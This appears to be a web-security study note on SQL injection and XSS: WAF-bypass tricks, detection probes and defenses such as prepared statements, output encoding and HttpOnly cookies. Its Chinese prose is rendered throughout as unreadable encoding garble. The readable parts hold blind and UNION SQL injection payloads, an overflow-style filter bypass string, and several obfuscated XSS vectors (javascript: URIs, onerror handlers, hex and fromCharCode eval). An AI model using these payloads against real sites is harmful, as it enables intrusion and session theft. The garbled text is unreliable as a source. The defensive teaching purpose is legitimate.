ç”¨æ¥æ¯”è¾ƒä¸¤ä¸ªå€¼ï¼Œå¦‚æžœæ¯”è¾ƒç»“æžœç›¸ç­‰å°±ä¸º 0ï¼Œå·¦è¾¹å°çš„è¯å°±ä¸º-1ï¼Œå¦åˆ™ä¸º 1ã€‚ 9ã€ç›²æ³¨æ— éœ€orå’Œand â€‹ ä¾‹å¥ï¼šindex.php?id=1 â€‹ å½“andå’Œorè¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥å°† 1ä¿®æ”¹ä¸ºæ˜¯é€šè¿‡è¯­å¥ç”Ÿæˆçš„ï¼Œ index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123ï¼Œ123 çš„æ—¶å€™é¡µé¢æ˜¯æ­£ç¡®çš„ï¼ŒçŽ°åœ¨å†ç›²çŒœ hash çš„ç¬¬ä¸€ä½ï¼Œå¦‚æžœç¬¬ä¸€ä½ç­‰äºŽ 0x42 ä¹Ÿå°±æ˜¯ Bï¼Œé‚£ä¹ˆstrcmpç»“æžœä¸º0ï¼Œ0+123=123ï¼Œæ‰€ä»¥é¡µé¢åº”è¯¥æ˜¯æ­£ç¡®çš„ã€‚å¦åˆ™å°±è¯´æ˜Žä¸æ˜¯ Bï¼Œå°±è¿™æ ·çŒœï¼Œä¸ç”¨ and å’Œ or äº†ã€‚ 10ã€åŠ æ‹¬å· â€‹ å¦‚?id=(1)union(select(1),mid(hash,1,32)from(users)) â€‹ ?id=(1)union(((((((select(1),hex(hash)from(users)))))))) â€‹ ?id=(1)or(0x50=0x50) 11ã€ç¼“å†²åŒºæº¢å‡ºç»•è¿‡ â€‹ å¦‚id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10 # â€‹ å…¶ä¸­ A è¶Šå¤šè¶Šå¥½ï¼Œä¸€èˆ¬è¦æ±‚ 1000 ä¸ªä»¥ä¸Šã€‚ ä¸‰ã€æ£€æµ‹æ–¹æ³•1ã€åŸºäºŽæŠ¥é”™çš„æ£€æµ‹æ–¹æ³• ä½¿ç”¨å„ç§ç¬¦å·ä»¥åŠç»„åˆï¼š â€˜ â€œ ( % å¦‚ç›´æŽ¥åœ¨URLåŽæ·»åŠ å•å¼•å·çœ‹æ˜¯å¦æŠ¥é”™index.php?id=1â€™ 2ã€åŸºäºŽå¸ƒå°”çš„æ£€æµ‹ æœ€å¸¸ç”¨çš„å¦‚1â€™ and â€˜1â€™=â€™1å’Œ1â€™ and â€˜1â€™=â€™2 ç›¸å½“äºŽ 1â€™ and â€˜1å’Œ1â€™ and â€˜0 å½“è¿”å›žçš„ç»“æžœä¸åŒæ—¶å³æœ‰æ¼æ´ž 3ã€ç›´æŽ¥åœ¨URLåœ°å€åŽé¢åŠ -1ã€-0ã€â€™%2Bâ€™å’Œâ€™%2Bâ€™a æ·»åŠ -1ï¼šindex.php?id=123-1ï¼Œå½“å‰åŽè®¿é—®çš„é¡µé¢ä¸åŒæ—¶ï¼Œå³å¯ç¡®å®šå­˜åœ¨æ•°å­—åž‹SQLæ³¨å…¥æ¼æ´žï¼› æ·»åŠ -0ï¼šindex.php?id=123-0ï¼Œå½“å‰åŽè®¿é—®çš„é¡µé¢ç›¸åŒæ—¶ï¼Œå†åŠ ä¸Š-1ï¼Œè¿”å›žé”™è¯¯é¡µé¢ï¼Œåˆ™è¡¨ç¤ºå­˜åœ¨æ•°å­—åž‹SQLæ³¨å…¥æ¼æ´žï¼› æ·»åŠ â€™%2Bâ€™å’Œâ€™%2Bâ€™aï¼šè¿™é‡Œ%2Bä¸ºâ€˜+â€™çš„URLç¼–ç ï¼Œå½“å…ˆæ·»åŠ â€™%2Bâ€™æ—¶index.php?id=123â€™%2Bâ€™è¿”å›žåŒæ ·çš„é¡µé¢ï¼Œè€Œæ·»åŠ â€™%2Bâ€™aæ—¶è¿”å›žé”™è¯¯ï¼Œè¿™ç§é€‚ç”¨äºŽSQLè¯­å¥ä¸­idå€¼è¢«ä¸€å¯¹å•å¼•å·æ‹¬èµ·æ¥çš„æƒ…å†µã€‚ 4ã€åˆ¤æ–­ç›²æ³¨çš„å¸¸ç”¨æ–¹æ³• 1â€™ and 1=1 # 1â€™ and 1=2 # åˆ¤æ–­è¿™ä¸¤ç§ä¸åŒçš„è¾“å…¥æ˜¯å¦æœ‰ä¸ä¸€æ ·çš„æ˜¾ç¤ºï¼Œå¦‚æžœä¸€ä¸ªæ­£å¸¸ä¸€ä¸ªé€šç”¨çš„é”™è¯¯æç¤ºæˆ–è€…å•¥ä¹Ÿä¸æ˜¾ç¤ºï¼Œåˆ™å‡ ä¹Žå¯ä»¥ç¡®å®šæ˜¯å«æœ‰SQLæ³¨å…¥æ¼æ´žçš„ã€‚ å››ã€é˜²å¾¡æ–¹æ³•å…³é”®æ˜¯å¯¹æ‰€æœ‰ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„æ£€æŸ¥è¿‡æ»¤ã€å¯¹æ•°æ®åº“é…ç½®ä½¿ç”¨æœ€å°æƒé™åŽŸåˆ™ã€‚ å¸¸ç”¨çš„ä¿®å¤æ–¹æ¡ˆ ï¼ˆ1ï¼‰æ‰€æœ‰çš„æŸ¥è¯¢è¯­å¥éƒ½ä½¿ç”¨æ•°æ®åº“æä¾›çš„å‚æ•°åŒ–æŸ¥è¯¢æŽ¥å£ï¼Œå‚æ•°åŒ–çš„è¯­å¥ä½¿ç”¨å‚æ•°è€Œä¸æ˜¯å°†ç”¨æˆ·è¾“å…¥å˜é‡åµŒå…¥åˆ° SQL è¯­å¥ä¸­ã€‚ ï¼ˆ2ï¼‰è¿‡æ»¤å±é™©çš„ SQL è¯­å¥å…³é”®å­—ã€‚ ï¼ˆ3ï¼‰ç¡®è®¤æ¯ç§æ•°æ®çš„ç±»åž‹ã€‚ ï¼ˆ4ï¼‰æ•°æ®é•¿åº¦åº”è¯¥ä¸¥æ ¼è§„å®šã€‚ ï¼ˆ5ï¼‰ç½‘ç«™æ¯ä¸ªæ•°æ®å±‚çš„ç¼–ç ç»Ÿä¸€ã€‚ ï¼ˆ6ï¼‰ä¸¥æ ¼é™åˆ¶ç½‘ç«™ç”¨æˆ·çš„æ•°æ®åº“çš„æ“ä½œæƒé™ã€‚ ï¼ˆ7ï¼‰é¿å…ç½‘ç«™æ˜¾ç¤º SQL é”™è¯¯ä¿¡æ¯ã€‚ ï¼ˆ8ï¼‰åœ¨ç½‘ç«™å‘å¸ƒä¹‹å‰å»ºè®®ä½¿ç”¨ä¸€äº›ä¸“ä¸šçš„ SQL æ³¨å…¥æ£€æµ‹å·¥å…·è¿›è¡Œæ£€æµ‹ã€‚ ï¼ˆ9ï¼‰å‡çº§ web æœåŠ¡å™¨è¿è¡Œå¹³å°è½¯ä»¶è¡¥ä¸ï¼Œå»ºè®®ä½¿ç”¨ WAF é˜²æŠ¤ã€‚ å…¶å®žæœ€æœ‰æ•ˆçš„é˜²å¾¡æ‰‹æ®µæ˜¯ä¸‹é¢ä¸¤ç§ï¼š 1ã€é¢„ç¼–è¯‘ åŽŸç†æ˜¯é‡‡ç”¨PreparedStatementå°†ç›¸åº”çš„SQLè¯­å¥é¢„å…ˆç¼–è¯‘å¥½ï¼Œå³SQLå¼•æ“Žä¼šé¢„å…ˆè¿›è¡Œè¯­æ³•åˆ†æžï¼Œäº§ç”Ÿè¯­æ³•æ ‘ï¼Œç”Ÿæˆæ‰§è¡Œè®¡åˆ’ï¼Œä»Žè€Œæ— è®ºç”¨æˆ·è¾“å…¥ä»€ä¹ˆå†…å®¹å³ä½¿æ˜¯sqlå‘½ä»¤éƒ½ä¸ä¼šå½±å“è¯¥SQLè¯­å¥çš„è¯­æ³•ç»“æž„è€Œåªèƒ½å½“æˆæ˜¯å­—ç¬¦ä¸²å­—é¢å€¼å‚æ•°ã€‚ä½†å¹¶ä¸æ˜¯æ‰€æœ‰åœºæ™¯éƒ½èƒ½é‡‡ç”¨SQLé¢„ç¼–è¯‘çš„ï¼Œå¦‚éœ€è¦è¿›è¡Œä¸€äº›å­—ç¬¦ä¸²æ‹¼æŽ¥çš„æ–¹å¼ï¼Œè¿™æ—¶ä¾¿éœ€è¦ä¸¥æ ¼æ£€æŸ¥å‚æ•°çš„æ•°æ®ç±»åž‹ä»¥åŠé‡‡ç”¨ä¸€äº›å®‰å…¨å‡½æ•°æ¥å¤„ç†ã€‚ å…¶è¿‡ç¨‹å¦‚ä¸‹: ï¼ˆ1ï¼‰å®šä¹‰é¢„ç¼–è¯‘çš„sqlè¯­å¥ï¼Œå…¶ä¸­å¾…å¡«å…¥çš„å‚æ•°ç”¨?å ä½ã€‚ ï¼ˆ2ï¼‰åˆ›å»ºé¢„ç¼–è¯‘Statementï¼Œå¹¶æŠŠsqlè¯­å¥ä¼ å…¥ã€‚æ­¤æ—¶sqlè¯­å¥å·²ä¸Žæ­¤preparedStatementç»‘å®šã€‚æ‰€ä»¥ç¬¬4æ­¥æ‰§è¡Œè¯­å¥æ—¶æ— éœ€å†æŠŠsqlè¯­å¥ä½œä¸ºå‚æ•°ä¼ å…¥execute()ã€‚ ï¼ˆ3ï¼‰å¡«å…¥å…·ä½“å‚æ•°ã€‚é€šè¿‡setXX(é—®å·ä¸‹æ ‡ï¼Œæ•°å€¼ï¼‰æ¥ä¸ºsqlè¯­å¥å¡«å…¥å…·ä½“æ•°æ®ã€‚é—®å·ä¸‹æ ‡ä»Ž1å¼€å§‹ï¼ŒsetXXä¸Žæ•°å€¼ç±»åž‹æœ‰å…³ï¼Œå­—ç¬¦ä¸²å°±æ˜¯setStringï¼ˆindexï¼Œstrï¼‰ã€‚ ï¼ˆ4ï¼‰æ‰§è¡Œé¢„å¤„ç†å¯¹è±¡ã€‚ ä¾‹å­ï¼š 1234String sql=&quot;select id,no from user where id=?&quot;;PreparedStatement ps = conn.prepareStatement(sql);prestmt.setInt(1,id);prestmt.executeQuery(); 2ã€å˜é‡ç»‘å®š æ˜¯æŒ‡åœ¨sqlè¯­å¥çš„æ¡ä»¶ä¸­ä½¿ç”¨å˜é‡è€Œä¸æ˜¯å¸¸é‡ï¼Œæ˜¯ä¸ºäº†å‡å°‘è§£æžçš„ã€‚å…·ä½“çš„ç»†èŠ‚ç½‘ä¸Šå¾ˆå¤šï¼ŒåŽé¢å†è¡¥å……ã€‚ XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰ä¸€ã€åŸºæœ¬æ¦‚å¿µæ¼æ´žå®šä¹‰ è·¨ç«™è„šæœ¬æ”»å‡»(Cross Site Scripting)ï¼Œä¸ºä¸å’Œå±‚å æ ·å¼è¡¨(Cascading Style Sheets, CSS)çš„ç¼©å†™æ··æ·†ï¼Œæ•…å°†è·¨ç«™è„šæœ¬æ”»å‡»ç¼©å†™ä¸ºXSSã€‚ â€‹ XSSï¼Œå…¨ç§°cross-site scriptingï¼Œæ˜¯ç”¨äºŽæ”»å‡»Webå®¢æˆ·ç«¯è€Œä¸æ˜¯æœåŠ¡å™¨ç«¯ï¼Œå…¶æœ€å¤§çš„ç‰¹ç‚¹æ˜¯èƒ½æŠŠæ¶æ„çš„JSæˆ–HTMLä»£ç æ³¨å…¥åˆ°ç”¨æˆ·æµè§ˆçš„ç½‘é¡µä¸Šã€‚è€ŒXSSæ¼æ´žçš„å­˜åœ¨ï¼Œä¸»è¦æ˜¯ç”±äºŽWebåº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤æ‰€å¯¼è‡´çš„ï¼Œå½“æ”»å‡»è€…æŠŠæ¶æ„ä»£ç æ³¨å…¥åˆ°ç½‘é¡µæ—¶ï¼Œç”¨æˆ·åªè¦è®¿é—®è¯¥ç½‘é¡µå°±ä¼šæ‰§è¡Œå…¶ä¸­çš„æ¶æ„ä»£ç ã€‚ æˆå›  é€ æˆXSSæ¼æ´žçš„åŽŸå› å°±æ˜¯ï¼Œæ”»å‡»è€…çš„è¾“å…¥æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„æŽ§åˆ¶ï¼Œæœ€ç»ˆæ˜¾ç¤ºç»™æ¥è®¿çš„ç”¨æˆ·ï¼Œæ”»å‡»è€…é€šè¿‡å·§å¦™çš„æ–¹æ³•æ³¨å…¥æ¶æ„æŒ‡ä»¤ä»£ç åˆ°ç½‘é¡µï¼Œä½¿ç”¨æˆ·åŠ è½½å¹¶æ‰§è¡Œæ”»å‡»è€…æ¶æ„åˆ¶é€ çš„ç½‘é¡µç¨‹åºã€‚è¿™äº›æ¶æ„ç½‘é¡µç¨‹åºé€šå¸¸æ˜¯JavaScriptï¼Œä½†å®žé™…ä¸Šä¹Ÿå¯ä»¥åŒ…æ‹¬Java,VBScriptï¼Œ ActiveXï¼Œ Flash æˆ–è€…ç”šè‡³æ˜¯æ™®é€šçš„HTMLã€‚æ”»å‡»æˆåŠŸåŽï¼Œæ”»å‡»è€…å¯èƒ½å¾—åˆ°æ›´é«˜çš„æƒé™ï¼ˆå¦‚æ‰§è¡Œä¸€äº›æ“ä½œï¼‰ã€ä¸ªäººç½‘é¡µå†…å®¹ã€ä¼šè¯å’Œcookieç­‰å„ç§å†…å®¹ã€‚ ç±»åž‹ ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‰3ç§ã€‚ â€‹ åå°„åž‹ï¼ˆéžæŒä¹…ï¼‰ï¼šä¸»è¦ç”¨äºŽå°†æ¶æ„ä»£ç é™„åŠ åˆ°URLåœ°å€çš„å‚æ•°ä¸­ï¼Œå¸¸ç”¨äºŽçªƒå–å®¢æˆ·ç«¯cookieä¿¡æ¯å’Œé’“é±¼æ¬ºéª—ã€‚ â€‹ å­˜å‚¨åž‹ï¼ˆæŒä¹…åž‹ï¼‰ï¼šæ”»å‡»è€…å°†æ¶æ„ä»£ç æ³¨å…¥åˆ°WebæœåŠ¡å™¨ä¸­å¹¶ä¿å­˜èµ·æ¥ï¼Œåªè¦å®¢æˆ·ç«¯è®¿é—®äº†ç›¸åº”çš„é¡µé¢å°±ä¼šå—åˆ°æ”»å‡»ã€‚ â€‹ DOMåž‹ï¼šåˆ©ç”¨æµè§ˆå™¨çš„DOMç‰¹æ€§ï¼Œä¸æ˜¯å‘æµè§ˆå™¨å‘è¯·æ±‚è€Œæ˜¯ç›´æŽ¥é€šè¿‡åœ¨æœ¬åœ°æ‰§è¡Œä»Žè€Œä¿®æ”¹æˆ–çªƒå–æœ¬åœ°çš„ä¿¡æ¯ã€‚ â€‹ Flashåž‹ï¼šåˆ©ç”¨ç½‘é¡µä¸Šflashæ–‡ä»¶çš„ç¼ºé™·æ¥æ‰§è¡Œjsè„šæœ¬ï¼Œä¸€èˆ¬æ˜¯åå°„åž‹XSSã€‚â€‹ mXSSåž‹ï¼šåˆè¢«å«åšçªå˜XSSï¼Œä¸»è¦è¢«ç”¨äºŽç»•è¿‡XSSè¿‡æ»¤ã€‚ç”¨æˆ·æ‰€æä¾›çš„å¯Œæ–‡æœ¬å†…å®¹é€šè¿‡javascriptä»£ç è¿›å…¥innerHTMLå±žæ€§åŽï¼Œä¸€äº›æ„å¤–çš„å˜åŒ–ä¼šä½¿å¾—ä¸€ä¸²çœ‹ä¼¼æ²¡æœ‰ä»»ä½•å±å®³çš„HTMLä»£ç ï¼Œæœ€ç»ˆå°†è¿›å…¥æŸä¸ªDOMèŠ‚ç‚¹çš„innerHTMLä¸­ï¼Œæµè§ˆå™¨çš„æ¸²æŸ“å¼•æ“Žä¼šå°†æœ¬æ¥æ²¡æœ‰ä»»ä½•å±å®³çš„HTMLä»£ç æ¸²æŸ“æˆå…·æœ‰æ½œåœ¨å±é™©çš„XSSæ”»å‡»ä»£ç ã€‚éšåŽï¼Œè¯¥æ®µæ”»å‡»ä»£ç å¯èƒ½ä¼šè¢«JSä»£ç ä¸­çš„å…¶å®ƒä¸€äº›æµç¨‹è¾“å‡ºåˆ°DOMä¸­æˆ–æ˜¯å…¶å®ƒæ–¹å¼è¢«å†æ¬¡æ¸²æŸ“ï¼Œä»Žè€Œå¯¼è‡´XSSçš„æ‰§è¡Œã€‚ ä½¿ç”¨åœºæ™¯ â€‹ ç›´æŽ¥åµŒå…¥html scriptæ ‡ç­¾ä¸­ â€‹ å…ƒç´ æ ‡ç­¾äº‹ä»¶ 1&lt;body onload=alert(â€˜xssâ€™)&gt; â€‹ å›¾ç‰‡æ ‡ç­¾ img â€‹ æ¡†æž¶æ ‡ç­¾ iframe â€‹ DOMå¯¹è±¡ åˆ©ç”¨æ–¹å¼ â€‹ çªƒå–ç”¨æˆ·cookieæ¥éžæ³•ç™»å½•è®¿é—®ç›®æ ‡ç«™ç‚¹ï¼› XSSä¸ŽCSRFæ¼æ´žç»“åˆåˆ©ç”¨ï¼Œä½¿å—å®³è€…åœ¨ä¸çŸ¥ä¸è§‰ä¸­ç”¨ç”¨æˆ·çš„è´¦å·è¿›è¡Œè½¬è´¦ç­‰æ•æ„Ÿå±é™©æ“ä½œï¼› â€‹ XSSè •è™«ï¼› â€‹ æ‰§è¡Œæ¶æ„JSä»£ç å®žçŽ°é”®ç›˜è®°å½•ï¼› â€‹ å†…åµŒæ¶æ„HTMLä»£ç åˆ°é¡µé¢ä¸­ï¼› â€‹ é¡µé¢æ¶æ„é‡å®šå‘ï¼› â€‹ åˆ©ç”¨XSSè¿›è¡ŒDDOSï¼Œå‚è€ƒï¼šSOHUè§†é¢‘XSSæ¼æ´žå¯¼è‡´å…¶ç”¨æˆ·æˆä¸ºDDOSè‚‰é¸¡ã€‚ äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•åˆ©ç”¨&lt;&gt;æ ‡è®°æ³¨å…¥HTMLæˆ–JS 1&lt;script&gt;alert(â€˜xssâ€™)&lt;/script&gt; åˆ©ç”¨HTMLæ ‡ç­¾å±žæ€§å€¼æ‰§è¡ŒXSS å¾ˆå¤šçš„HTMLæ ‡è®°ä¸­çš„å±žæ€§éƒ½æ”¯æŒjavascript:[code]ä¼ªåè®®çš„å½¢å¼ 1&lt;img src=â€javascript:alert('xss');â€&gt; ç©ºæ ¼å›žè½¦TAB ç©ºç™½ä¸ä¼šå½±å“JSè¯­å¥çš„åœ¨æ­£å¸¸æ‰§è¡Œ 1&lt;img src=â€javas cript:alert('xss')â€ width=100&gt; å¯¹æ ‡ç­¾å±žæ€§å€¼è¿›è¡Œè½¬ç  HTMLå±žæ€§å€¼æœ¬èº«æ˜¯æ”¯æŒASCIIç å½¢å¼çš„ 1&lt;img src=â€javascript:alert('xss')â€ width=100&gt; â€‹ å…¶ä¸­tçš„ASCIIç å€¼ä¸º116ï¼Œç”¨â€œ&amp;#116â€æ¥è¡¨ç¤ºï¼Œè€Œå†’å·:çš„ASCIIå€¼ä¸º58ã€‚ â€‹ å¦å¤–ï¼ŒTabç¬¦çš„ASCIIç ä¸º&amp;#9ã€æ¢è¡Œç¬¦çš„ä¸º&amp;#10ã€å›žè½¦ç¬¦çš„ä¸º&amp;#13å¯ä»¥è¢«æ’å…¥åˆ°ä»£ç çš„ä»»ä½•åœ°æ–¹ä¸­åŽ»ã€‚ â€‹ è¿˜å¯ä»¥å°†&amp;#01ã€&amp;#02ç­‰å­—ç¬¦æ’å…¥åˆ°JavaScriptçš„å¤´éƒ¨ä¸­ã€‚ äº§ç”Ÿè‡ªå·±çš„äº‹ä»¶ â€‹ äº‹ä»¶æ˜¯ç”¨æˆ·æˆ–æµè§ˆå™¨è‡ªèº«æ‰§è¡Œçš„æŸä¸ªåŠ¨ä½œï¼Œå¦‚Clickç­‰ 1&lt;img src=http://10.10.10.137/alan.jpg onerror=alert('xss')&gt; â€‹ onerroræ˜¯imgæ ‡ç­¾çš„ä¸€ä¸ªäº‹ä»¶ï¼Œåªè¦é¡µé¢å‘ç”Ÿé”™è¯¯å°±ä¼šæ¿€æ´»ç›¸åº”çš„äº‹ä»¶ã€‚ â€‹ é™¤æ­¤ä¹‹å¤–è¿˜æœ‰å„ç§äº‹ä»¶ï¼Œå¦‚ï¼šonResumeã€onfinishã€onstopã€onReverseç­‰ç­‰ã€‚ åˆ©ç”¨CSSè·¨ç«™å‰–æž â€‹ CSSæ˜¯XSSçš„å¦ä¸€ä¸ªè½½ä½“ï¼Œä»£ç é€šå¸¸æ˜¯åµŒå…¥åˆ°styleæ ‡ç­¾/å±žæ€§ä¸­çš„ã€‚ â€‹ ç¼ºç‚¹æ˜¯ä¸ªæµè§ˆå™¨ä¹‹é—´ä¸èƒ½é€šç”¨ã€‚ æ‰°ä¹±è¿‡æ»¤è§„åˆ™ è½¬æ¢å¤§å°å†™ï¼Œé¡ºåºå¯ä»¥éšæ„ åŒå¼•å·ä¸Žå•å¼•å·äº’æ¢ ä¸ä½¿ç”¨å¼•å· æ³¨é‡Šç¬¦å· å†…åµŒ å­—ç¬¦ç¼–ç  å¯ä»¥å¯¹ä»£ç è¿›è¡Œåè¿›åˆ¶ç¼–ç ï¼ˆ&amp;#ï¼‰ï¼Œå¯ä»¥åœ¨æ¯ä¸ªåè¿›åˆ¶å­—ç¬¦åŽé¢åŠ ä¸Šåˆ†å·ï¼›ï¼Œä¹Ÿå¯ä»¥é‡‡ç”¨&amp;#0ã€&amp;#00ï¼›ç­‰çš„å½¢å¼ã€‚ â€‹ JSä¸­çš„eval()å‡½æ•°ï¼Œç”¨äºŽè®¡ç®—å­—ç¬¦ä¸²å¹¶æ‰§è¡Œå…¶ä¸­çš„JSä»£ç ã€‚å¯ä»¥ä½¿ç”¨\è¿žæŽ¥åå…­è¿›åˆ¶å­—ç¬¦ä¸²å½¢å¼çš„è„šæœ¬è®©eval()å‡½æ•°æ¥æ‰§è¡Œï¼Œå¦‚ 1&lt;script&gt;eval(â€œ\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29â€);&lt;/script&gt; â€‹ ä¹Ÿå¯ä»¥è®©å…¶æ‰§è¡Œåè¿›åˆ¶å½¢å¼çš„è„šæœ¬ï¼Œä½†éœ€è¦å’ŒString.fromCharCode()å‡½æ•°ä¸€èµ·ä½¿ç”¨ã€å®žçŽ°å°†å­—ç¬¦è½¬ä¸ºASCIIå€¼ï¼Œå¦‚ 1&lt;img src="javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))"&gt; â€‹ åœ¨åˆ©ç”¨CSSä¸­ï¼Œå¯ä»¥å¯¹styleä¸­çš„å±žæ€§è¿›è¡Œåå…­è¿›åˆ¶çš„ç¼–ç æ¥ç»•è¿‡ã€‚ Shellcodeçš„è°ƒç”¨ â€‹ ç®€å•åœ°è¯´ï¼ŒShellcodeæ˜¯æŒ‡å¯¹ä¸€ä¸ªæ¼æ´žè¿›è¡Œåˆ©ç”¨çš„ä»£ç ã€‚ åŠ¨æ€è°ƒç”¨è¿œç¨‹JS å°†shellcodeä¿å­˜åœ¨å…¶ä»–æœåŠ¡å™¨ä¸­ï¼Œç„¶åŽå†ç”¨scriptæ ‡ç­¾æ¥åŠ¨æ€åŠ è½½ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡åŸºäºŽDOMçš„æ–¹æ³•åˆ›å»ºå’Œæ’å…¥ç»“ç‚¹ï¼ŒæŠŠä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¸­ã€‚è¿™ä¸¤ç§æ–¹å¼åœ¨åˆ©ç”¨ä¸­éƒ½æœ‰ç›¸åº”çš„æ¼”ç¤ºã€‚ ä½¿ç”¨window.location.hash â€‹ å³DOMåž‹ã€‚locationæ˜¯JSç®¡ç†åœ°å€æ çš„å†…ç½®å¯¹è±¡ï¼Œlocation.hashåˆ™æ˜¯ç”¨æ¥èŽ·å–æˆ–è®¾ç½®é¡µé¢çš„æ ‡ç­¾å€¼ã€‚ç›¸å…³çš„ç®€å•çš„åˆ©ç”¨å·²æœ‰ç¤ºä¾‹ï¼Œè‡³äºŽDOMåž‹çš„XSSä¼šæœ‰è¿›ä¸€æ­¥çš„ç¬”è®°ã€‚ ä¸‰ã€æ£€æµ‹æ–¹æ³•â€‹ å¯»æ‰¾è„šæœ¬ç¨‹åºçš„è¾“å‡ºæ˜¾ç¤ºä»£ç ï¼Œæœç´¢å…³é”®å­—ï¼Œæ˜¾ç¤ºè¾“å‡ºé‚£ä¸ªå˜é‡ï¼Œè·Ÿè¸ªå˜é‡æ˜¯å¦è¢«è¿‡æ»¤ã€‚ â€‹ å¯ä»¥å…ˆè¾“å…¥ä¸€äº›å†…å®¹ï¼Œé¡µé¢è¿”å›žä¹‹åŽï¼Œå¯ä»¥æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œæœç´¢å†…å®¹å…³é”®å­—çœ‹çœ‹æ˜¯ä¸æ˜¯ç›´æŽ¥è¿”å›žåœ¨é¡µé¢çš„HTMLä»£ç ä¸­ã€‚ å››ã€é˜²å¾¡æ–¹æ³•1ã€è°ƒç”¨å‡½æ•° â€‹ å¯¹äºŽç”¨æˆ·æäº¤çš„æ•°æ®å¯ä»¥é€šè¿‡è°ƒç”¨å‡½æ•°è¿›è¡Œè¿‡æ»¤ï¼Œhtmlspecialchars()å‡½æ•°å°†è¾“å‡ºçš„å†…å®¹è¿›è¡ŒHTMLçš„ç¼–ç ï¼Œæ•ˆæžœæœ€å¥½ï¼›str_replace()å‡½æ•°å¯ä»¥å°†æŒ‡å®šçš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºå…¶ä»–å­—ç¬¦ä¸²çš„ï¼Œä½†æ˜¯ä¼šè¢«ç»•è¿‡ã€‚ 2ã€ä½¿ç”¨XSS Filter ï¼ˆ1ï¼‰è¾“å…¥è¿‡æ»¤ â€‹ è¾“å…¥éªŒè¯ï¼ˆå®¢æˆ·ç«¯ï¼‰ï¼šå‰ç«¯JSè¿‡æ»¤ï¼Œå¦‚æ£€æµ‹æœ€å¤§é•¿åº¦ã€æ˜¯å¦åªæœ‰åˆæ³•å­—ç¬¦ã€æ ¼å¼æ˜¯å¦ç¬¦åˆè¦æ±‚ã€æ•°å­—æ˜¯å¦åœ¨æŒ‡å®šçš„èŒƒå›´å†…ã€‚ç¼ºç‚¹å°±æ˜¯å®¹æ˜“è¢«ä¿®æ”¹æŽ‰ã€‚ â€‹ æ•°æ®æ¶ˆæ¯’ï¼ˆæœåŠ¡å™¨ç«¯ï¼‰ï¼šè¿‡æ»¤æ•æ„Ÿå­—ç¬¦ï¼ˆå¯ä»¥å’ŒSQLæ³¨å…¥çš„ä¸€åŒè¿‡æ»¤ï¼‰ï¼Œå¦‚&lt; &gt; javascript â€˜ â€œ &amp; # expressionç­‰ã€‚ ï¼ˆ2ï¼‰ è¾“å‡ºç¼–ç ï¼ˆæœåŠ¡å™¨ç«¯ï¼‰ â€‹ å¯ä»¥ä½¿ç”¨HTMLç¼–ç ï¼ˆPHPçš„htmlspecialchars()å‡½æ•°ã€ASPçš„Server.HTMLEncode()å‡½æ•°ã€ASP.NETçš„Server.HtmlEncode()å‡½æ•°ï¼‰ï¼Œç”¨å¯¹åº”çš„HTMLå®žä½“æ›¿ä»£å­—é¢é‡å­—ç¬¦ï¼Œæ­¤æ—¶æµè§ˆå™¨ä¼šå°†æ¶æ„ä»£ç å½“ä½œHTMLæ–‡æ¡£çš„å†…å®¹è€Œä¸æ˜¯ç»“æž„åŠ ä»¥å¤„ç†ã€‚ å¸¸è§æ¶æ„å­—ç¬¦çš„HTMLç¼–ç ï¼ˆæ˜¾ç¤ºã€å®žä½“åå­—ã€å®žä½“ç¼–å·ï¼‰ï¼š &lt; &lt;; &amp;#60ï¼› > &gt; &amp;#62ï¼› &amp; &amp; &amp;#38ï¼› â€œ â€œ &amp;#34ï¼› â€˜ â€˜ 3ã€ç™½åå•å’Œé»‘åå•ç»“åˆ 4ã€Noscript â€‹ Firefoxçš„ä¸€æ¬¾å…è´¹çš„å¼€æºæ’ä»¶ï¼Œé»˜è®¤ç¦æ­¢æ‰€æœ‰è„šæœ¬ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡è‡ªå®šä¹‰è®¾ç½®å…è®¸é€šè¿‡çš„è„šæœ¬ã€‚ 5ã€Anti_XSS â€‹ æä¾›å¤§é‡çš„ç¼–ç å‡½æ•°ç”¨äºŽå¤„ç†ç”¨æˆ·çš„è¾“å…¥ï¼Œå®žçŽ°ç™½åå•æœºåˆ¶å’Œè¾“å‡ºè½¬ä¹‰ã€‚ 6ã€HttpOnly â€‹ æ”»å‡»è€…é€šè¿‡XSSæ¼æ´žæ‰§è¡ŒJSä¸­çš„document.cookieæ–¹æ³•æ¥çªƒå–ç”¨æˆ·çš„cookieä¿¡æ¯ã€‚Webåº”ç”¨ç¨‹åºåœ¨Set-Cookieæ—¶å°†å…¶å±žæ€§è®¾ä¸ºHttpOnlyå³å¯é¿å…Cookieè¢«å®¢æˆ·ç«¯JSå­˜å–ï¼Œä¹Ÿå¯ä»¥ä¿æŠ¤ç”¨æˆ·çš„Cookieä¿¡æ¯ä¸è¢«ç›—å–ã€‚ â€‹ PHPè®¾ç½®HttpOnlyçš„æ–¹æ³•ï¼š â€‹ ï¼ˆ1ï¼‰ ä¿®æ”¹php.iniæ–‡ä»¶ï¼Œè®¾ç½®å…¶å€¼ä¸º1æˆ–TRUEï¼› â€‹ ï¼ˆ2ï¼‰ setcookie()å‡½æ•°å’Œsetrawcookie()å‡½æ•°çš„ç¬¬ä¸ƒä¸ªå‚æ•°ï¼› â€‹ ï¼ˆ3ï¼‰åœ¨PHPä»£ç ä¸­å¼€å¯ã€‚ 7ã€Webå®‰å…¨ç¼–ç è§„èŒƒ â€‹ 